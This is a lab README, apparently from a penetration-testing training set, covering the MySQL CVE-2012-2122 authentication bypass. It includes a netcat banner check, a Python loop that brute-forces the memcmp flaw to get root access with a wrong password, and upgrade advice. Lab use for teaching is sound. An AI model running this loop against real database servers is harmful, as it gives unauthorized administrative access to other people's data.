# MySQL Authentication Bypass memcmp Return Value Flaw (CVE-2012-2122)

## Overview

MySQL and MariaDB versions prior to 5.1.63, 5.5.24, and 5.6.6 contain a critical authentication bypass flaw (CVE-2012-2122). Due to an improper integer casting bug when evaluating the return value of memcmp(), approximately 1 out of every 256 login attempts succeeds with an incorrect password. Attackers can loop connection requests to gain administrative access without credentials.

- **Service Access**: `http://localhost:8179/`
- **Default Credentials**: `Bypass with any password in ~256 attempts`
- **Docker Shortcut**: `./lab start mysql-auth-bypass`
- **Container Name**: `cyberlab_04_mysql_auth_bypass`
- **RAM Footprint**: ~100M

---

## Exploitation Walkthrough

### 1. Check MySQL Banner

```bash
nc -vn 127.0.0.1 8179
```

### 2. Loop Connection Attempts to Trigger Bypass

```bash
python3 -c "
import subprocess, sys
for i in range(300):
    res = subprocess.run(['mysql', '-h', '127.0.0.1', '-P', '8179', '-u', 'root', '--password=wrongpass', '-e', 'SELECT \'PWNED\';'], capture_output=True, text=True)
    if 'PWNED' in res.stdout:
        print(f'Bypass successful at attempt {i}!')
        sys.exit(0)
"
```

### 3. Verify Admin Access

```bash
# MySQL shell confirms root query execution.
```

---

## Defensive Remediation & Hardening

1. Upgrade MySQL to version 5.5.24, 5.6.6 or higher.
2. Do not expose MySQL database ports directly to the internet.

---

## Video Walkthroughs & Technical References

- [Full Ethical Hacking Course - Beginner Network Penetration Testing (2019)](https://www.youtube.com/watch?v=WnN6dbos5u8)
- [MySQL Security Advisory CVE-2012-2122](https://nvd.nist.gov/vuln/detail/CVE-2012-2122)
- [Vulhub MySQL CVE-2012-2122 Environment](https://vulhub.org/#/environments/mysql/CVE-2012-2122/)
